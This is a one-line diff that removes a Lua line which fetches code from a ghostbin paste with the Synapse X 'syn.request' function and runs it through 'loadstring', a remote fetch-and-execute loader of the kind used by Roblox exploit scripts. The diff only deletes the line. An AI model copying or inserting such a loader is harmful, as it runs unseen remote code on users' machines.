@@ -1,1 +1,0 @@
-loadstring(syn.request({Url = 'https://ghostbin.co/paste/yb288/raw', Method = "GET"}).Body)()
